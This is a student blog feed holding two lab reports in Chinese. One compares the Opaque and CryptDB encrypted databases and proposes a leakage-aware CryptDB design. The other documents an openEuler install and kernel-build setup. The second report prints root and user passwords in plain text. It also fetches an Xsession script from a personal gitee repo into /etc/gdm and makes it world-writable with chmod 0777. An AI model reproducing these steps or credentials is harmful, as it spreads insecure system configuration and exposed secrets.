<p><strong>在性能与安全权衡方面，</strong>Opaque的测评展示了“有代价，但可接受”的现实：与未加保护的Spark SQL相比，Opaque在不开启obliviousness时仅引入有限开销（在某些工作负载下甚至接近原生），这是得益于SGX在CPU内部提供的高速隔离执行；当开启完整的 oblivious 模式以保护访问模式时，代价显著增加（论文中给出的范围是从约1.6×到几十倍的开销，取决于查询类型和数据规模）。作者还展示了在某些常见分析任务上，obliviousness的额外成本可以被系统级优化（如重用oblivious排序、合并多个操作的单次oblivious shuffle）所部分抵消。总体结论是：要在云端做到“机密且不泄露访问模式”的大规模分析，使用TEE+分布式oblivious算子是一个可行但成本可观的工程方案。</p>
<p><strong>Opaque的局限性与实际挑战也非常值得注意并在论文中被坦率讨论。</strong>首先，它依赖于硬件TEE（主要是Intel SGX）作为可信根，这带来了两个问题：SGX的可用内存（enclave内存）有限，频繁的enclave ↔ 非-enclave切换本身会带来性能惩罚，而且SGX曾被证明存在侧信道（如缓存&#x2F;分支&#x2F;页面泄露）以及微架构攻击面的脆弱性；其次，完全的obliviousness在许多数据密集型操作（尤其是全局排序和大规模join）上代价非常高，会大幅增加网络与计算开销，从而影响可伸缩性与成本效益。论文和后续社区工作均强调：工程上需要权衡何时必须保证oblivious（例如在多方联合或高敏感度场景），何时可以放松以换取性能。</p>
<p><strong>在学术与产业影响方面，</strong>Opaque被视为将TEE与oblivious算子结合以实现可扩展机密分析的“开创”工作之一；它催生了后续大量研究（例如针对更快的 oblivious primitives、改进的ORAM分布式实现、以及将差分隐私与TEE结合的方案），并且激发了产业界将机密计算作为产品化方向（例如Opaque的研究成果后续被商业化，出现了以“Opaque&#x2F;OPAQUE”命名的公司&#x2F;产品，提供 Confidential AI与隐私数据协作平台，已与云厂商与企业客户展开合作）。这些进展表明，从研究样机到工程化产品，机密计算与隐私分析正在进入实际采纳阶段，但技术可信度、合规性与运营复杂度仍是推广路上的关键门槛。</p>
<p><strong>对比CryptDB：</strong>Opaque提供了一个系统性且更强的保密目标，CryptDB的策略是通过部分同态或PPE（property-preserving encryption）在密文上保持某些查询能力，结果不可避免地泄露等价&#x2F;排序等信息，从而在静态数据场景下容易被辅助信息攻击恢复明文；而Opaque追求的是在执行过程中既不泄露明文，也不泄露访问模式（通过在硬件enclaves内执行并使用oblivious算子隐藏访问模式），因此理论上能抵抗包括访问模式推断在内的更强攻击类。不过，这种额外的安全性是以更复杂的实现、性能开销和对硬件可信度的依赖为代价的。换言之：CryptDB在查询功能与性能上更“轻量”，但面临的统计&#x2F;推断风险更高；Opaque在安全性上更强，但工程代价、硬件假设与操作复杂度也更高。</p>
<p><strong>对CryptDB的可借鉴改进建议</strong>（基于Opaque的思想与实践）有几条值得在工程&#x2F;研究上优先考虑：</p>
<p>在关键敏感操作路径引入受信任执行环境：对那些高度敏感列或计算（例如身份识别、合并后的关键汇总），可以将代理或特定计算放到 TEE 中执行，从而避免将这些明文或详细访问模式暴露给数据库主机。</p>
<p>混合使用oblivious与非-oblivious 算子：并非所有查询都需要完全 oblivious；可以设计策略判断哪些查询&#x2F;阶段必须 oblivious（如跨租户 join），哪些可以走低成本 PPE 路径，这类似Opaque的query planner 思路。</p>
<p>增量引入oblivious primitives：先实现代价相对较低的oblivious局部算子（如局部 padding 的 partition）来减少关键路径的访问模式泄露，再在需要时扩展到全局 oblivious 操作。</p>
<p>在恢复与备份环节使用TEEs：像CryptZip那类需要在恢复时解密并重新加密的操作，可以放在硬件隔离环境中运行以减少中间明文泄露风险。</p>
<p>评估并缓解硬件侧信道：因为Opaque与任何SGX方案一样可能遭遇侧信道，任何把关键路径放TE的改进都应同时采用side-channel 缓解（例如constant-time实现、页面访问模式平滑、噪声注入或enclave内部secure paging 设计）。这些做法可逐步提升CryptDB 在现实部署中的抗推断能力，同时尽量控制性能损失。</p>
<p><strong>最后，关于Opaque的现实意义与未来方向：</strong>Opaque展现了把高级数据库功能（SQL&#x2F;Analytics）和强机密性保障结合起来的可行路径，并推动了“Confidential Computing”从研究向产品化的迁移。随着云厂商、芯片厂商以及行业合规需求的共同推动，像Opaque这类设计将继续演进：要么降低oblivious算子的成本（通过新的算法与系统优化），要么通过更强大的硬件（更大的enclave、硬件支持的oblivious primitives）来缩短性能差距。同时，如何把差分隐私、可证明安全与合规审计整合进这样的系统，也是当前研究社区与工业界关注的重点。对任何考虑在云端处理敏感数据的组织，Opaque提供了一条清晰的参考路径：以硬件为根、在算子级别保证不可观测性、并在查询层面精细化安全与性能的折中。</p>
<h4 id="设计一个面向安全与性能权衡的CryptDB改进方案"><a href="#设计一个面向安全与性能权衡的CryptDB改进方案" class="headerlink" title="设计一个面向安全与性能权衡的CryptDB改进方案"></a>设计一个面向安全与性能权衡的CryptDB改进方案</h4><p>在对CryptDB<sup>[1][3]</sup>架构、属性保持加密（PPE）的泄露风险以及CryptZip<sup>[8]</sup>等改进工作进行综合调研后，我提出一个面向工程可落地的改进方案**Leakage-aware CryptDB++**。该方案的目标并非完全重构CryptDB，而是在其原有代理–数据库结构上，以较低侵入性方式增强安全性和备份性能，使系统在真实部署场景中更加稳健与易用。</p>
<p>（1）设计动机：现有 CryptDB 的两个突出问题促使我们提出改进：</p>
<p><strong>a.属性保持加密的结构性泄露：</strong>CryptDB使用DET、OPE、HOM等加密方式以支持SQL查询，但不可避免地泄露：等值模式、顺序与范围结构、长期访问模式。</p>
<p>已有研究表明，仅通过密文分布、排序关系以及少量辅助背景信息，攻击者即可对PPE保护的数据发起高精度推断攻击<sup>[3]</sup>。特别是Naveed等人在CCS 2015中展示了针对DET与OPE的系统性推断方法，可在真实数据集上恢复大部分原始数据的统计特征，从而对用户隐私造成严重威胁。此外，访问模式与查询频率本身也被证明是重要的泄露来源<sup>[4][7]</sup>。</p>
<p><strong>b.加密备份体积膨胀：</strong>密文本身高度随机、难以压缩，使加密数据库备份体积远大于明文数据库<sup>[8][9]</sup>。对于周期性备份的大型系统，这会造成明显存储成本压力。</p>
<p>因此，我们需要一个兼顾泄露控制与存储友好性的综合增强方案。</p>
<p>（2）整体思路：Leakage-aware CryptDB++从CryptDB的核心优势出发，并在其两侧增设两大增强模块：</p>
<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/image-37.png" alt="图37"></p>
<p><strong>①泄露感知策略层（Leakage-aware Policy Layer）：</strong>位于应用端与CryptDB proxy 之间；用于自动选择合适的加密方式、模糊访问行为、平滑频率分布。</p>
<p><strong>②压缩友好备份层（Compression-aware Backup Layer）：</strong>位于存储端和备份工具之间，将冷数据迁移到压缩友好型编码结构中，提高备份压缩比。</p>
<p>这两个模块互不影响CryptDB原有的onion加密与SQL功能，使方案具有较强的可插拔性。</p>
<p>（3）模块设计</p>
<p><strong>a.泄露感知策略层：</strong>该模块通过<strong>列级策略+查询模糊化+轻量频率扰动</strong>减少DET&#x2F;OPE的统计结构泄露<sup>[7]</sup>。</p>
<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/image-38.png" alt="图38"></p>
<p><strong>①列级安全策略选择</strong></p>
<p>系统根据schema分析每一列的：敏感度（如：用户隐私类&#x2F;业务类&#x2F;公开类）、查询需求（等值、范围、聚合）</p>
<p>自动选择更安全的加密方式，例如：高敏感+等值查询：避免DET，使用随机化哈希+等值索引<sup>[2]</sup>；范围查询列：采用safer-ORE或基于分桶的区间编码替代OPE<sup>[5][6]</sup>；低敏感列：保留原方案以避免性能损失。这样既降低泄露，又不让整个系统一刀切地牺牲性能。</p>
<p><strong>②查询模糊化（Query Obfuscation）</strong></p>
<p>为减弱访问模式泄露<sup>[4]</sup>，策略层引入以下机制：</p>
<p>Batching：合并短时间内重复查询，减弱访问频率泄露</p>
<p>Dummy Queries：按比例注入对随机&#x2F;dummy数据的查询，增加访问分布噪声</p>
<p>结果端过滤：代理负责剔除dummy查询返回的数据，保持应用透明。</p>
<p>攻击者很难通过日志判断哪些记录是真正的热点。</p>
<p><strong>③频率平滑（Frequency Smoothing）</strong></p>
<p>针对DET密文的频率分布，采取简单但有效的扰动策略：</p>
<p>高频值→拆分成多个编码（如1 → 1a&#x2F;1b&#x2F;1c）</p>
<p>低频值→自动添加极少量dummy行，使分布更平滑</p>
<p>这样可以有效降低基于密文统计分布的重构攻击成功率<sup>[10]</sup>。</p>
<p><strong>b.压缩友好备份层</strong></p>
<p>为解决密文备份膨胀问题，我引入冷热数据分层与压缩友好型编码。</p>
<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/image-39.png" alt="图39"></p>
<p><strong>①热&#x2F;冷数据分离：</strong>热数据区（近期频繁访问）保持CryptDB原有结构，确保查询速度；冷数据区采用结构化密文编码，使相同字段的密文更具“可压缩性”。</p>
<p>这本质上是对CryptZip思路的扩展，将其变成CrytpDB的一部分。</p>
<p><strong>②压缩友好加密+传统压缩：</strong>冷区数据采用结构化密文后，对Gzip、Zstd等压缩算法的记录间模式更友好，可使备份体积显著下降<sup>[8][9]</sup>。</p>
<p><strong>③分级恢复机制：</strong>恢复时先恢复热区，保证主要业务尽快可用；再按需异步恢复冷区，提高灾难恢复效率。</p>
<p>（4）预期效果与价值：Leakage-aware CryptDB++并未追求使用昂贵的ORAM&#x2F;TEE等机制，而是通过更轻量的方式实现以下收益。</p>
<p><strong>a.安全性提升：</strong>推断攻击成功率显著下降、高频&#x2F;低频值难以识别、访问热度无法直接观察、整体泄露面更难利用。这提高了CryptDB在更广泛场景中的可信度。</p>
<p><strong>b.存储与备份成本降低：</strong>冷数据备份可实现明显压缩，适用于：长期日志、历史订单、不常查询的归档数据。</p>
<p>在大规模数据库中，这一改进具有实际工程意义。</p>
<p><strong>c.保持高可用性与低侵入性：</strong>应用端几乎无需修改，CryptDB本身也无需重写核心机制，增强模块可以在实际系统中逐步部署。</p>
<p>Leakage-aware CryptDB++的核心贡献在于：<strong>以策略层+存储层的方式增强 CryptDB，而非推翻其架构；用工程可落地的轻量化方法控制泄露风险；显著降低加密备份的空间开销；在性能、存储与安全之间找到更灵活的平衡点。</strong></p>
<p><strong>参考文献：</strong></p>
<p>[1] Popa, R. A., Redfield, C. M. S., Zeldovich, N., and Balakrishnan, H. <strong>CryptDB: Protecting Confidentiality with Encrypted Query Processing.</strong> In <em>Proceedings of the 23rd ACM Symposium on Operating Systems Principles (SOSP)</em>, 2011. <a href="https://people.csail.mit.edu/nickolai/papers/raluca-cryptdb.pdf">https://people.csail.mit.edu/nickolai/papers/raluca-cryptdb.pdf</a></p>
<p>[2] Popa, R. A., and Zeldovich, N. <strong>Multi-Key Searchable Encryption.</strong> In <em>Proceedings of the 22nd USENIX Security Symposium</em>, 2013. <a href="https://eprint.iacr.org/2013/508.pdf#:~:text=We%20construct%20a%20searchable%20encryption%20scheme%20that%20enables,in%20client-server%20applications%20against%20attacks%20on%20the%20server">https://eprint.iacr.org/2013/508.pdf#:~:text=We%20construct%20a%20searchable%20encryption%20scheme%20that%20enables,in%20client-server%20applications%20against%20attacks%20on%20the%20server</a>.</p>
<p>[3] Naveed, M., Kamara, S., and Wright, C. V. <strong>Inference Attacks on Property-Preserving Encrypted Databases.</strong> In <em>Proceedings of the 22nd ACM SIGSAC Conference on Computer and Communications Security (CCS)</em>, 2015.</p>
<p>[4] Islam, M. S., Kuzu, M., and Kantarcioglu, M. <strong>Access Pattern Disclosure on Searchable Encryption.</strong> In <em>Proceedings of the Network and Distributed System Security Symposium (NDSS)</em>, 2012. <a href="https://personal.utdallas.edu/~mxk055100/publications/ndss2012.pdf">https://personal.utdallas.edu/~mxk055100/publications/ndss2012.pdf</a></p>
<p>[5] Boldyreva, A., Chenette, N., Lee, Y., and O’Neill, A. <strong>Order-Preserving Symmetric Encryption.</strong> In <em>Advances in Cryptology – EUROCRYPT</em>, 2009. <a href="https://faculty.cc.gatech.edu/~aboldyre/papers/bclo.pdf">https://faculty.cc.gatech.edu/~aboldyre/papers/bclo.pdf</a></p>
<p>[6] Lewi, K., and Wu, D. J. <strong>Order-Revealing Encryption: New Constructions, Applications, and Lower Bounds.</strong> In <em>Proceedings of the 23rd ACM SIGSAC Conference on Computer and Communications Security (CCS)</em>, 2016. <a href="https://eprint.iacr.org/2016/612.pdf">https://eprint.iacr.org/2016/612.pdf</a></p>
<p>[7] Cash, D., Grubbs, P., Perry, J., and Ristenpart, T. <strong>Leakage-Abuse Attacks Against Searchable Encryption.</strong> In <em>Proceedings of the 22nd ACM SIGSAC Conference on Computer and Communications Security (CCS)</em>, 2015. <a href="https://dl.acm.org/doi/pdf/10.1145/2810103.2813700">https://dl.acm.org/doi/pdf/10.1145/2810103.2813700</a></p>
<p>[8] Chen, S., Li, S., Yiu, S. M., and Wang, P. <strong>CryptZip: Compression-Friendly Encrypted Data Storage.</strong> In <em>Proceedings of the IEEE International Conference on Distributed Computing Systems (ICDCS)</em>, 2015. <a href="https://acs.ict.ac.cn/baoyg/pub/202203/P020220317732938145367.pdf#:~:text=We%20present%20CryptZip%2C%20a%20backup%20and%20re-covery%20system,one%20or%20several%20columns%20among%20semantically%20redun-dant%20columns">https://acs.ict.ac.cn/baoyg/pub/202203/P020220317732938145367.pdf#:~:text=We%20present%20CryptZip%2C%20a%20backup%20and%20re-covery%20system,one%20or%20several%20columns%20among%20semantically%20redun-dant%20columns</a>.</p>
<p>[9] Bellare, M., Boldyreva, A., and O’Neill, A. <strong>Deterministic and Efficiently Searchable Encryption.</strong> In <em>Advances in Cryptology – CRYPTO</em>, 2007. <a href="https://eprint.iacr.org/2006/186.pdf">https://eprint.iacr.org/2006/186.pdf</a></p>
<p>[10] Grubbs, P., Lacharité, M.-S., Minaud, B., and Paterson, K. G. <strong>Learning to Reconstruct: Statistical Learning Theory and Encrypted Database Attacks.</strong> <em>In Proceedings of the 2019 IEEE Symposium on Security and Privacy (SP), pp. 1067–1083.</em> <a href="https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&arnumber=8835288">https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&amp;arnumber=8835288</a></p>
]]></content>
      <categories>
        <category>第5学期实验</category>
        <category>大数据安全作业</category>
      </categories>
      <tags>
        <tag>北邮</tag>
        <tag>实验</tag>
        <tag>大数据安全</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统OpenEuler实验</title>
    <url>/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="操作系统OpenEuler实验"><a href="#操作系统OpenEuler实验" class="headerlink" title="操作系统OpenEuler实验"></a>操作系统OpenEuler实验</h2><h3 id="实验内容与环境"><a href="#实验内容与环境" class="headerlink" title="实验内容与环境"></a>实验内容与环境</h3><h4 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h4><p>完成openEuler操作系统的安装，完成内核更新，在此基础上，增加完成其他功能。本次实验已增添完成：内核模块编程、内存管理、内核时间管理。</p>
<h4 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h4><p>虚拟机Vmware和openEuler操作系统。</p>
<h3 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h3><h4 id="openEuler操作系统安装"><a href="#openEuler操作系统安装" class="headerlink" title="openEuler操作系统安装"></a>openEuler操作系统安装</h4><p>1.下载OpenEular镜像</p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/01-download-openeuler.png" alt="下载OpenEuler镜像"></p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/02-openeuler-iso.png" alt="OpenEuler镜像文件"></p>
<p>2.安装到虚拟机</p>
<p>（1）新建虚拟机</p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/03-create-vm.png" alt="新建虚拟机"></p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/04-vm-config.png" alt="虚拟机配置"></p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/05-vm-settings.png" alt="虚拟机设置"></p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/06-vm-created.png" alt="虚拟机创建完成"></p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/07-start-vm.png" alt="启动虚拟机"></p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/08-install-screen1.png" alt="安装界面1"></p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/09-install-screen2.png" alt="安装界面2"></p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/10-install-screen3.png" alt="安装界面3"></p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/11-install-screen4.png" alt="安装界面4"></p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/12-install-screen5.png" alt="安装界面5"></p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/13-install-screen6.png" alt="安装界面6"></p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/14-install-screen7.png" alt="安装界面7"></p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/15-install-screen8.png" alt="安装界面8"></p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/16-install-screen9.png" alt="安装界面9"></p>
<p>（2）进入虚拟机，开始安装</p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/17-vm-install-start.png" alt="进入虚拟机安装"></p>
<p>①等待安装检查</p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/18-install-check1.png" alt="安装检查1"></p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/19-install-check2.png" alt="安装检查2"></p>
<p>②进行语言设置：选择中文</p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/20-language-setting.png" alt="语言设置"></p>
<p>③进行软件选择：这里我们选择最小安装，附加选项为标准和开发工具</p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/21-software-selection1.png" alt="软件选择1"></p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/22-software-selection2.png" alt="软件选择2"></p>
<p>④设置ROOT密码：12Lhl0408</p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/23-root-password.png" alt="设置ROOT密码"></p>
<p>⑤创建用户：设置用户名为buptoslihaolun2023211595</p>
<p>设置密码为123456@Lhl04，这里我设置了不需要密码即可登录账户</p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/24-create-user.png" alt="创建用户"></p>
<p>⑥安装完成：进行重启</p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/25-install-complete.png" alt="安装完成"></p>
<p>⑦随后进入系统。</p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/26-enter-system.png" alt="进入系统"></p>
<p>⑧输入刚刚设置的账号密码进行登录</p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/27-login-screen.png" alt="登录界面"></p>
<p>（3）执行相应指令</p>
<p>①执行uname -a指令</p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/28-uname-command.png" alt="执行uname -a指令"></p>
<p>②执行getconf PAGESIZE指令，查看openEuler的分页大小，为4096</p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/29-pagesize-command.png" alt="执行getconf PAGESIZE指令"></p>
<p>（4）安装桌面环境（gnome）以及terminal</p>
<p>①配置清华源</p>
<p>先输入以下指令打开配置文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/yum.repos.d/openEuler_x86_64.repo <span class="comment">#打开配置文件</span></span><br></pre></td></tr></table></figure>

<p>打开后按下键盘i键进入编辑模式，添加以下内容。添加完成后按下esc结束编辑模式。输入:wq!保存并退出。</p>
<p>#添加如下内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">\[osrepo\]</span><br><span class="line">name=osrepo</span><br><span class="line">baseurl=https://mirrors.tuna.tsinghua.edu.cn/openeuler/openEuler-20.03-LTS/OS/x86_64/</span><br><span class="line">enabled=1</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=https://mirrors.tuna.tsinghua.edu.cn/openeuler/openEuler-20.03-LTS/OS/x86_64/RPM-GPG-KEY-openEuler</span><br></pre></td></tr></table></figure>

<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/30-configure-source.png" alt="配置清华源"></p>
<p>②安装gnome、terminal</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dnf install gnome-shell gdm gnome-session <span class="comment">#安装 gnome 及相关组件</span></span><br></pre></td></tr></table></figure>

<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/31-install-gnome1.png" alt="安装gnome组件1"></p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/32-install-gnome2.png" alt="安装gnome组件2"></p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/33-install-gnome3.png" alt="安装gnome组件3"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dnf install gnome-terminal <span class="comment">#安装 terminal</span></span><br></pre></td></tr></table></figure>

<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/34-install-terminal1.png" alt="安装terminal1"></p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/35-install-terminal2.png" alt="安装terminal2"></p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/36-install-terminal3.png" alt="安装terminal3"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#设置开机自启动</span></span><br><span class="line">systemctl <span class="built_in">enable</span> gdm.service</span><br><span class="line">systemctl set-default graphical.target</span><br></pre></td></tr></table></figure>

<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/37-set-autostart.png" alt="设置开机自启动"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#补全丢失文件</span></span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">wget https://gitee.com/name1e5s/xsession/raw/master/Xsession</span><br><span class="line"><span class="built_in">mv</span> Xsession /etc/gdm/</span><br><span class="line"><span class="built_in">chmod</span> 0777 /etc/gdm/Xsession</span><br></pre></td></tr></table></figure>

<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/38-fix-missing-files1.png" alt="补全丢失文件1"></p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/39-fix-missing-files2.png" alt="补全丢失文件2"></p>
<p>③gnome 桌面安装成功</p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/40-gnome-desktop-success.png" alt="gnome桌面安装成功"></p>
<p>（4）执行uname -a指令、getconf PAGESIZE指令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line">getconf PAGESIZE</span><br></pre></td></tr></table></figure>

<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/41-system-info-commands.png" alt="执行系统信息指令"></p>
<p>（5）安装Firefox</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y install firefox <span class="comment">#顺便安装 firefox</span></span><br></pre></td></tr></table></figure>

<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/42-install-firefox1.png" alt="安装Firefox1"></p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/43-install-firefox2.png" alt="安装Firefox2"></p>
<h4 id="内核更新"><a href="#内核更新" class="headerlink" title="内核更新"></a>内核更新</h4><p>1.系统备份</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">dnf install lrzsz <span class="comment"># rz和sz可以在终端下很方便的传输文件</span></span><br><span class="line">tar czvf boot_origin.tgz /boot/</span><br><span class="line">sz boot_origin.tgz <span class="comment"># 将备份文件发送到本地</span></span><br></pre></td></tr></table></figure>

<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/44-system-backup1.png" alt="系统备份1"></p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/45-system-backup2.png" alt="系统备份2"></p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/46-system-backup3.png" alt="系统备份3"></p>
<p>2.内核源码下载</p>
<p>（1）在gitee仓库中下载openEuler内核压缩文件</p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/47-download-kernel-source.png" alt="下载内核源码"></p>
<p>（2）解压缩至&#x2F;usr&#x2F;src&#x2F;kernels</p>
<p>移动文件指令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">mv</span> /home/buptoslihaolun2023211595/Downloads/kernel-4.19.90-2405.5.0 /usr/src/kernels/</span><br></pre></td></tr></table></figure>

<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/48-move-kernel-files.png" alt="移动内核文件"></p>
<p>3.清理代码树：进入解压好的源码文件夹执行命令，清理过去内核编译产生的文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make mrproper</span><br></pre></td></tr></table></figure>

<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/49-clean-code-tree.png" alt="清理代码树"></p>
<p>4.生成内核配置文件.config</p>
<p>（1）先将将系统原配置文件拷贝过来</p>
